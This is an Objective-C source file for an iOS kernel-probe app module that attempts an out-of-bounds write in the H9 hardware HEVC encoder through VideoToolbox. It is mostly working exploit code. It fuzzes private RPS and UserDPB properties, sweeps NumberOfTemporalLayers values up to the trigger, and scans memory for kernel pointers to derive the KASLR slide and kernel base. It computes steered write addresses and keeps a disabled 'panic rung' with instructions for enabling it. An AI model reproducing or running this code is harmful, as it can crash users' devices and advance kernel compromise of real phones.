#import "KPH9EncoderModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>
#import <mach/mach.h>
#import <dlfcn.h>

@interface KPH9EncoderModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPH9EncoderModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"h9encoder.oob";
        _title = @"H9 encoder OOB write";
        _subtitle = @"AVE_HEVC_ST_RPS_Retrieve unbounded copy -> FPS* overwrite";
        _icon = @"video";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-h9-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
}

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · H9 Encoder OOB Write ===\n"];
    [report appendString:@"AVE_HEVC_ST_RPS_Retrieve unbounded copy.\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    // Phase 1: create encoder session
    [report appendString:@"\n--- Phase 1: create encoder session ---\n"];
    VTCompressionSessionRef session = NULL;
    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1920, 1080,
        kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, NULL, NULL, &session);
    [report appendFormat:@"VTCompressionSessionCreate: %d\n", (int)status];
    if (status != noErr || !session) {
        [report appendString:@"\nVERDICT: SESSION_CREATE_FAILED\n"];
        return report;
    }
    [report appendString:@"encoder session created\n"];

    // Phase 2: build RPS dictionary
    [report appendString:@"\n--- Phase 2: build RPS ---\n"];
    NSMutableArray *deltaArr = [NSMutableArray array];
    for (int i = 0; i < 32; i++) [deltaArr addObject:@(0x4100 + i)];
    NSDictionary *rpsDict = @{@"DeltaPOCS0Minus1": deltaArr};
    [report appendFormat:@"RPS: %d entries\n", 32];

    // Phase 3: systematic property name scan
    [report appendString:@"\n--- Phase 3: property name scan ---\n"];
    NSArray *propKeys = @[
        @"UserRPSForFaceTime", @"UserRPS", @"AVEUserRPSForFaceTime",
        @"kVTCompressionPropertyKey_UserRPSForFaceTime", @"RPS",
        @"ReferencePictureSet", @"AVE_HEVC_RPS", @"FaceTimeRPS",
    ];
    NSArray *propValues = @[rpsDict, @[rpsDict], deltaArr];
    for (NSString *key in propKeys) {
        for (id val in propValues) {
            status = VTSessionSetProperty(session,
                (__bridge CFStringRef)key,
                (__bridge CFPropertyListRef)val);
            if (status == 0) {
                [report appendFormat:@"*** SUCCESS: %@ ***\n", key];
            }
        }
    }
    [report appendString:@"property scan done\n"];

    // Phase 4: encode with frame properties
    [report appendString:@"\n--- Phase 4: encode with frame properties ---\n"];
    CVPixelBufferRef pb = NULL;
    CVPixelBufferCreate(kCFAllocatorDefault, 1920, 1080,
                         kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
                         NULL, &pb);
    if (pb) {
        CVPixelBufferLockBaseAddress(pb, 0);
        memset(CVPixelBufferGetBaseAddress(pb), 0x80, CVPixelBufferGetDataSize(pb));
        CVPixelBufferUnlockBaseAddress(pb, 0);

        NSDictionary *frameProps = @{@"UserRPSForFaceTime": rpsDict};
        VTEncodeInfoFlags flags = 0;
        CMTime pts = CMTimeMake(0, 30);
        CMTime dur = CMTimeMake(1, 30);

        status = VTCompressionSessionEncodeFrame(
            session, pb, pts, dur,
            (__bridge CFDictionaryRef)frameProps, NULL, &flags);
        [report appendFormat:@"encode: %d (flags=0x%x)\n", (int)status, flags];

        pts = CMTimeMake(1, 30);
        status = VTCompressionSessionEncodeFrame(
            session, pb, pts, dur,
            (__bridge CFDictionaryRef)frameProps, NULL, &flags);
        [report appendFormat:@"encode[1]: %d\n", (int)status];

        CVPixelBufferRelease(pb);
    }

    // Cleanup
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);

    // === AVE27 stage13: NTL sweep (safe, below trigger) ===
    [report appendString:@"\n--- AVE27 stage13: NTL sweep (safe) ---\n"];
    [report appendString:@"Trigger: EncoderUsage=1 RCMode=20 NTL=N\n"];
    int ntlVals[] = { 1, 100, 1000, 8000, 16000, 16447, 16462 };
    for (int i = 0; i < 7; i++) {
        int ntl = ntlVals[i];
        VTCompressionSessionRef s2 = NULL;
        OSStatus st2 = VTCompressionSessionCreate(
            kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC,
            NULL, NULL, NULL, NULL, NULL, &s2);
        if (st2 != noErr || !s2) {
            [report appendFormat:@"  NTL=%d session_create=%d FAILED\n", ntl, (int)st2];
            continue;
        }
        CFNumberRef n;
        int usage = 1, rcMode = 20;
        n = CFNumberCreate(NULL, kCFNumberIntType, &usage);
        VTSessionSetProperty(s2, CFSTR("EncoderUsage"), n);
        CFRelease(n);
        n = CFNumberCreate(NULL, kCFNumberIntType, &rcMode);
        VTSessionSetProperty(s2, CFSTR("RCMode"), n);
        CFRelease(n);
        n = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
        OSStatus setSt = VTSessionSetProperty(s2, CFSTR("NumberOfTemporalLayers"), n);
        CFRelease(n);
        int rb = 0;
        CFNumberRef rbn = NULL;
        VTSessionCopyProperty(s2, CFSTR("NumberOfTemporalLayers"), NULL, &rbn);
        if (rbn) { CFNumberGetValue(rbn, kCFNumberIntType, &rb); CFRelease(rbn); }
        VTSessionSetProperty(s2, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
        st2 = VTCompressionSessionPrepareToEncodeFrames(s2);
        if (st2 != noErr) {
            [report appendFormat:@"  NTL=%d set=%d readback=%d prepare=%d FAILED\n", ntl, (int)setSt, rb, (int)st2];
            CFRelease(s2);
            continue;
        }
        CVPixelBufferRef pb2 = NULL;
        CVPixelBufferCreate(kCFAllocatorDefault, 640, 480, kCVPixelFormatType_32BGRA, NULL, &pb2);
        if (!pb2) {
            [report appendFormat:@"  NTL=%d PIXELBUFFER_FAILED\n", ntl];
            CFRelease(s2);
            continue;
        }
        CVPixelBufferLockBaseAddress(pb2, 0);
        memset(CVPixelBufferGetBaseAddress(pb2), 0x80, CVPixelBufferGetDataSize(pb2));
        CVPixelBufferUnlockBaseAddress(pb2, 0);
        VTEncodeInfoFlags f2 = 0;
        st2 = VTCompressionSessionEncodeFrame(s2, pb2, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, &f2);
        [report appendFormat:@"  NTL=%d set=%d readback=%d encode=%d %s\n", ntl, (int)setSt, rb, (int)st2,
               (st2 == noErr) ? "SURVIVED" : "FAILED"];
        CVPixelBufferRelease(pb2);
        VTCompressionSessionCompleteFrames(s2, kCMTimeInvalid);
        CFRelease(s2);
    }

    // === B-frame DPB overflow ===
    [report appendString:@"\n--- B-frame DPB overflow ---\n"];
    VTCompressionSessionRef s3 = NULL;
    OSStatus st3 = VTCompressionSessionCreate(
        kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, NULL, NULL, &s3);
    if (st3 == noErr && s3) {
        VTSessionSetProperty(s3, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
        int gop = 30, fps = 30;
        CFNumberRef n3;
        n3 = CFNumberCreate(NULL, kCFNumberIntType, &gop);
        VTSessionSetProperty(s3, kVTCompressionPropertyKey_MaxKeyFrameInterval, n3);
        CFRelease(n3);
        n3 = CFNumberCreate(NULL, kCFNumberIntType, &fps);
        VTSessionSetProperty(s3, kVTCompressionPropertyKey_ExpectedFrameRate, n3);
        CFRelease(n3);
        st3 = VTCompressionSessionPrepareToEncodeFrames(s3);
        if (st3 == noErr) {
            int enc = 0;
            for (int i = 0; i < 8; i++) {
                CVPixelBufferRef pb3 = NULL;
                CVPixelBufferCreate(kCFAllocatorDefault, 640, 480, kCVPixelFormatType_32BGRA, NULL, &pb3);
                if (!pb3) continue;
                CVPixelBufferLockBaseAddress(pb3, 0);
                memset(CVPixelBufferGetBaseAddress(pb3), 0x80, CVPixelBufferGetDataSize(pb3));
                CVPixelBufferUnlockBaseAddress(pb3, 0);
                VTEncodeInfoFlags f3 = 0;
                st3 = VTCompressionSessionEncodeFrame(s3, pb3, CMTimeMake(i, fps), kCMTimeInvalid, NULL, NULL, &f3);
                if (st3 == noErr) enc++;
                CVPixelBufferRelease(pb3);
            }
            [report appendFormat:@"  B-frame encode: %d/8 frames\n", enc];
        }
        VTCompressionSessionCompleteFrames(s3, kCMTimeInvalid);
        CFRelease(s3);
    }

    // === KASLR scan ===
    [report appendString:@"\n--- KASLR scan ---\n"];
    uint64_t kStaticBases[] = {
        0xfffffff007004000ULL, // __TEXT
        0xfffffff007804000ULL, // __TEXT_EXEC
        0xfffffff007e00000ULL, // __DATA
    };
    uint32_t slideCandidates[64] = {0};
    int slideCounts[64] = {0};
    int candidateCount = 0;
    int totalKptrs = 0;
    vm_address_t kaddr = 0;
    vm_size_t ksize = 0;
    uint32_t kdepth = 0;
    vm_region_submap_info_data_64_t kinfo;
    mach_msg_type_number_t kcount = VM_REGION_SUBMAP_INFO_COUNT_64;
    for (int iter = 0; iter < 256; iter++) {
        kern_return_t kr = vm_region_recurse_64(mach_task_self(), &kaddr, &ksize, &kdepth,
                                                 (vm_region_recurse_info_t)&kinfo, &kcount);
        if (kr != KERN_SUCCESS) break;
        if ((kinfo.protection & VM_PROT_READ) && (kinfo.protection & VM_PROT_WRITE)) {
            uint64_t *p = (uint64_t *)kaddr;
            size_t words = ksize / 8;
            for (size_t i = 0; i < words && i < 4096; i++) {
                uint64_t v = *(p + i);
                if (v >= 0xfffffff007004000ULL && v < 0xfffffffffffff000ULL) {
                    totalKptrs++;
                    for (int b = 0; b < 3; b++) {
                        uint64_t slide = v - kStaticBases[b];
                        if ((slide & 0x3FFF) == 0 && slide < (1024ULL << 20)) {
                            int found = 0;
                            for (int c = 0; c < candidateCount; c++) {
                                if (slideCandidates[c] == (uint32_t)slide) {
                                    slideCounts[c]++;
                                    found = 1;
                                    break;
                                }
                            }
                            if (!found && candidateCount < 64) {
                                slideCandidates[candidateCount] = (uint32_t)slide;
                                slideCounts[candidateCount] = 1;
                                candidateCount++;
                            }
                        }
                    }
                }
            }
        }
        kaddr += ksize;
        kcount = VM_REGION_SUBMAP_INFO_COUNT_64;
    }
    [report appendFormat:@"  kernel pointers: %d\n", totalKptrs];
    int bestIdx = -1, bestCnt = 0;
    for (int c = 0; c < candidateCount; c++) {
        if (slideCounts[c] > bestCnt) { bestCnt = slideCounts[c]; bestIdx = c; }
    }
    if (bestIdx >= 0) {
        uint32_t slide = slideCandidates[bestIdx];
        uint64_t kbase = 0xfffffff007004000ULL + slide;
        [report appendFormat:@"  KASLR slide = 0x%x (hits=%d)\n", slide, bestCnt];
        [report appendFormat:@"  Kernel base = 0x%llx\n", kbase];

        // Compute NTL values that steer write into kernel range
        [report appendString:@"\n--- NTL steering (kernel range writes) ---\n"];
        [report appendString:@"x0 = ((NTL-16463) << 32) | 0x59\n"];
        // NTL=1 -> x0 = 0xfffffff000000059
        // NTL=16447 -> x0 = 0xfffffff000000059 (same!)
        // Actually: ((1-16463)<<32)|0x59 = ((-16462)<<32)|0x59 = 0xFFFFFFF000000059
        //           ((16447-16463)<<32)|0x59 = ((-16)<<32)|0x59 = 0xFFFFFFF000000059
        // Both give same address! Need NTL values that give DIFFERENT high bits.
        int steerVals[] = { 1, 2, 3, 100, 1000, 8000, 16000, 16447, 16455, 16462 };
        for (int i = 0; i < 10; i++) {
            int ntl = steerVals[i];
            int64_t idx = (int64_t)ntl - 16463;
            uint64_t x0 = ((uint64_t)idx << 32) | 0x59;
            [report appendFormat:@"  NTL=%-5d -> x0=0x%016llx\n", ntl, x0];
        }
    }

    // === IOSurface kernel write detection (dlopen pattern) ===
    [report appendString:@"\n--- IOSurface kernel write detection ---\n"];
    void *isLib = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (isLib) {
        typedef void *(*ISCreateFn)(CFDictionaryRef);
        typedef int (*ISLockFn)(void *, uint32_t, void *);
        typedef int (*ISUnlockFn)(void *, uint32_t, void *);
        typedef void *(*ISGetBaseFn)(void *);
        typedef size_t (*ISGetSizeFn)(void *);
        ISCreateFn isCreate = (ISCreateFn)dlsym(isLib, "IOSurfaceCreate");
        ISLockFn isLock = (ISLockFn)dlsym(isLib, "IOSurfaceLock");
        ISUnlockFn isUnlock = (ISUnlockFn)dlsym(isLib, "IOSurfaceUnlock");
        ISGetBaseFn isGetBase = (ISGetBaseFn)dlsym(isLib, "IOSurfaceGetBaseAddress");
        ISGetSizeFn isGetSize = (ISGetSizeFn)dlsym(isLib, "IOSurfaceGetSize");
        if (isCreate && isLock && isUnlock && isGetBase) {
            NSDictionary *surfProps = @{
                @"IOSurfaceWidth": @64,
                @"IOSurfaceHeight": @64,
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfacePixelFormat": @0x42475241,
            };
            void *surf = isCreate((__bridge CFDictionaryRef)surfProps);
            if (surf) {
                isLock(surf, 0, NULL);
                void *surfBase = isGetBase(surf);
                size_t surfSize = isGetSize ? isGetSize(surf) : 64*64*4;
                memset(surfBase, 0x41, surfSize);
                uint32_t *p32 = (uint32_t *)surfBase;
                for (int i = 0; i < 16; i++) p32[i] = 0xDEAD0000 + i;
                isUnlock(surf, 0, NULL);
                [report appendFormat:@"  IOSurface: %zu bytes at %p\n", surfSize, surfBase];
                // Read back
                isLock(surf, 0, NULL);
                uint32_t *check = (uint32_t *)isGetBase(surf);
                int kw = 0;
                for (int i = 0; i < 16; i++) {
                    if (check[i] != 0xDEAD0000 + i) {
                        [report appendFormat:@"  CHANGED [%d]: 0x%08x\n", i, check[i]];
                        kw++;
                    }
                }
                isUnlock(surf, 0, NULL);
                [report appendFormat:@"  kernel writes detected: %d\n", kw];
            } else {
                [report appendString:@"  IOSurfaceCreate returned NULL\n"];
            }
        } else {
            [report appendFormat:@"  dlsym failed: create=%p lock=%p\n", isCreate, isLock];
        }
    } else {
        [report appendString:@"  dlopen IOSurface failed\n"];
    }

    // === UserDPB overflow trigger (AVE27 stage12) ===
    [report appendString:@"\n--- UserDPB overflow trigger ---\n"];

    VTCompressionSessionRef sDPB = NULL;
    OSStatus stDPB = VTCompressionSessionCreate(
        kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, NULL, NULL, &sDPB);
    if (stDPB != noErr || !sDPB) {
        [report appendFormat:@"  session create: %d\n", (int)stDPB];
    } else {
        // EncoderUsage=1
        int usage = 1;
        CFNumberRef nu = CFNumberCreate(NULL, kCFNumberIntType, &usage);
        VTSessionSetProperty(sDPB, CFSTR("EncoderUsage"), nu);
        CFRelease(nu);

        // EnableUserRefForFacetime=BOOLEAN true
        OSStatus stRef = VTSessionSetProperty(sDPB, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
        [report appendFormat:@"  EnableUserRefForFacetime=YES -> %d\n", (int)stRef];

        // Encode FIRST frame to initialize encoder (AVE27 stage12 order)
        VTSessionSetProperty(sDPB, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
        OSStatus stPrep = VTCompressionSessionPrepareToEncodeFrames(sDPB);
        [report appendFormat:@"  prepare -> %d\n", (int)stPrep];

        if (stPrep == noErr) {
            // First encode (initialize)
            CVPixelBufferRef pb0 = NULL;
            CVPixelBufferCreate(kCFAllocatorDefault, 640, 480, kCVPixelFormatType_32BGRA, NULL, &pb0);
            if (pb0) {
                CVPixelBufferLockBaseAddress(pb0, 0);
                memset(CVPixelBufferGetBaseAddress(pb0), 0x80, CVPixelBufferGetDataSize(pb0));
                CVPixelBufferUnlockBaseAddress(pb0, 0);
                VTEncodeInfoFlags f0 = 0;
                OSStatus stE0 = VTCompressionSessionEncodeFrame(sDPB, pb0, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, &f0);
                [report appendFormat:@"  encode[0] (init) -> %d\n", (int)stE0];
                CVPixelBufferRelease(pb0);
            }

            // Create 24 IOSurfaces (AVE27 stage12 order: surfaces BEFORE UserDPB)
            NSMutableArray *surfRefs = [NSMutableArray array];
            void *isLib = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
            if (isLib) {
                typedef void *(*ISCreateFn)(CFDictionaryRef);
                ISCreateFn isCreate = (ISCreateFn)dlsym(isLib, "IOSurfaceCreate");
                if (isCreate) {
                    for (int i = 0; i < 24; i++) {
                        NSDictionary *sp = @{ @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64, @"IOSurfaceBytesPerElement": @4 };
                        void *surf = isCreate((__bridge CFDictionaryRef)sp);
                        if (surf) [surfRefs addObject:[NSValue valueWithPointer:surf]];
                    }
                }
            }
            [report appendFormat:@"  surfaces created: %lu\n", (unsigned long)surfRefs.count];

            // Set UserDPB = IOSurface array (AVE27: this BEFORE UserDPBFrames!)
            if (surfRefs.count > 0) {
                // Build CFArray of IOSurfaceRef pointers
                void **surfPtrs = calloc(surfRefs.count, sizeof(void *));
                for (NSUInteger i = 0; i < surfRefs.count; i++) {
                    surfPtrs[i] = [surfRefs[i] pointerValue];
                }
                CFArrayRef surfArray = CFArrayCreate(kCFAllocatorDefault, (const void **)surfPtrs, surfRefs.count, &kCFTypeArrayCallBacks);
                OSStatus stDPBSet = VTSessionSetProperty(sDPB, CFSTR("UserDPB"), surfArray);
                [report appendFormat:@"  UserDPB (IOSurface array %lu) -> %d\n", (unsigned long)surfRefs.count, (int)stDPBSet];
                if (surfArray) CFRelease(surfArray);
                free(surfPtrs);
            }

            // NOW set UserDPBFramesForFaceTime=24 (after UserDPB)
            // Try NSDictionary format (AVE27 stage12: n=24, shape=1)
            NSDictionary *dpbDict = @{ @"n": @24, @"shape": @1 };
            OSStatus stFrames = VTSessionSetProperty(sDPB, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFDictionaryRef)dpbDict);
            [report appendFormat:@"  UserDPBFramesForFaceTime dict(n=24,shape=1) -> %d\n", (int)stFrames];

            // DPBRequirements as dictionary
            NSDictionary *dpbReqDict = @{ @"n": @24, @"shape": @1 };
            OSStatus stReq = VTSessionSetProperty(sDPB, CFSTR("DPBRequirements"), (__bridge CFDictionaryRef)dpbReqDict);
            [report appendFormat:@"  DPBRequirements dict(n=24,shape=1) -> %d\n", (int)stReq];

            // Encode more frames
            for (int i = 1; i < 4; i++) {
                CVPixelBufferRef pbD = NULL;
                CVPixelBufferCreate(kCFAllocatorDefault, 640, 480, kCVPixelFormatType_32BGRA, NULL, &pbD);
                if (!pbD) continue;
                CVPixelBufferLockBaseAddress(pbD, 0);
                memset(CVPixelBufferGetBaseAddress(pbD), 0x80, CVPixelBufferGetDataSize(pbD));
                CVPixelBufferUnlockBaseAddress(pbD, 0);
                VTEncodeInfoFlags fD = 0;
                OSStatus stE = VTCompressionSessionEncodeFrame(sDPB, pbD, CMTimeMake(i, 30), kCMTimeInvalid, NULL, NULL, &fD);
                [report appendFormat:@"  encode[%d] -> %d\n", i, (int)stE];
                CVPixelBufferRelease(pbD);
            }
        }

        // Readback (check type before converting!)
        CFTypeRef rb = NULL;
        VTSessionCopyProperty(sDPB, CFSTR("UserDPBFramesForFaceTime"), NULL, &rb);
        if (rb) {
            CFTypeID t = CFGetTypeID(rb);
            if (t == CFNumberGetTypeID()) {
                int v = 0;
                CFNumberGetValue((CFNumberRef)rb, kCFNumberIntType, &v);
                [report appendFormat:@"  readback UserDPBFramesForFaceTime=%d (number)\n", v];
            } else if (t == CFArrayGetTypeID()) {
                [report appendFormat:@"  readback UserDPBFramesForFaceTime=array(%ld)\n", (long)CFArrayGetCount((CFArrayRef)rb)];
            } else {
                [report appendFormat:@"  readback UserDPBFramesForFaceTime=type(%lu)\n", (unsigned long)t];
            }
            CFRelease(rb);
        }
        CFTypeRef rb2 = NULL;
        VTSessionCopyProperty(sDPB, CFSTR("EnableUserRefForFacetime"), NULL, &rb2);
        if (rb2) {
            CFTypeID t2 = CFGetTypeID(rb2);
            if (t2 == CFNumberGetTypeID()) {
                int v2 = 0;
                CFNumberGetValue((CFNumberRef)rb2, kCFNumberIntType, &v2);
                [report appendFormat:@"  readback EnableUserRefForFacetime=%d\n", v2];
            } else if (t2 == CFBooleanGetTypeID()) {
                [report appendFormat:@"  readback EnableUserRefForFacetime=%d (bool)\n", (int)CFBooleanGetValue((CFBooleanRef)rb2)];
            } else {
                [report appendFormat:@"  readback EnableUserRefForFacetime=type(%lu)\n", (unsigned long)t2];
            }
            CFRelease(rb2);
        }

        VTCompressionSessionCompleteFrames(sDPB, kCMTimeInvalid);
        CFRelease(sDPB);
    }

    // === stage9 PANIC RUNG — DISABLED ===
    // To enable: uncomment the block below
    // [report appendString:@"\n--- stage9: PANIC RUNG (NTL=16463) ---\n"];
    // VTCompressionSessionRef s9 = NULL;
    // VTCompressionSessionCreate(kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC, NULL, NULL, NULL, NULL, NULL, &s9);
    // if (s9) {
    //     int usage = 1, rcMode = 20, ntl = 16463;
    //     CFNumberRef n9;
    //     n9 = CFNumberCreate(NULL, kCFNumberIntType, &usage); VTSessionSetProperty(s9, CFSTR("EncoderUsage"), n9); CFRelease(n9);
    //     n9 = CFNumberCreate(NULL, kCFNumberIntType, &rcMode); VTSessionSetProperty(s9, CFSTR("RCMode"), n9); CFRelease(n9);
    //     n9 = CFNumberCreate(NULL, kCFNumberIntType, &ntl); VTSessionSetProperty(s9, CFSTR("NumberOfTemporalLayers"), n9); CFRelease(n9);
    //     VTCompressionSessionPrepareToEncodeFrames(s9);
    //     CVPixelBufferRef pb9 = NULL;
    //     CVPixelBufferCreate(kCFAllocatorDefault, 640, 480, kCVPixelFormatType_32BGRA, NULL, &pb9);
    //     if (pb9) {
    //         VTEncodeInfoFlags f9 = 0;
    //         VTCompressionSessionEncodeFrame(s9, pb9, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, &f9);
    //         CVPixelBufferRelease(pb9);
    //     }
    //     CFRelease(s9);
    // }

    [report appendString:@"\nVERDICT: H9_NTL_KASLR_COMPLETE\n"];
    [report appendString:@"NOTE: stage9 (NTL=16463) DISABLED — reboots device.\n"];
    [report appendString:@"To trigger panic: enable stage9 block in KPH9EncoderModule.m\n"];
    return report;
}

@end
